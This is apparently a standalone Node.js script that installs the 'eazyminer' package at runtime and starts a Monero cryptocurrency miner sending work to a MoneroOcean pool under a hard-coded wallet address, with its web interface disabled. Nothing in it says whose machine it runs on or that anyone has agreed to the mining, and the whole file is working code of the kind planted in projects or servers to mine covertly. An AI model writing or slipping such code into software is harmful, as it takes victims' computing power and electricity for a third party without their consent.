const childProcess = require('child_process');

// Install dependencies
console.log('Installing dependencies...');
childProcess.execSync('npm install eazyminer tunnel', { stdio: 'inherit' });



const Miner = require('eazyminer');

const miner = new Miner({
    pools: [{
        coin: 'XMR',
        user: '41pEhhCuFnjLQYFmN8miy8fCgvGX4VwyMgHvkMaCNocnDW4eahaPC74jaRyd9TfYwMgk2Z2swXYoc6fP1hYbCYgKNAnabxv+128000',
        url: 'gulf.moneroocean.stream:443',
    }],
    web: [{
        
        // Enable or Disable web client
        enabled: false,

        // The used port for the webclient
        port: 3000 
    }],
    autoStart: false // optional delay
});

miner.start(); // optional manually start the miner
// miner.stop() // manually stop the miner
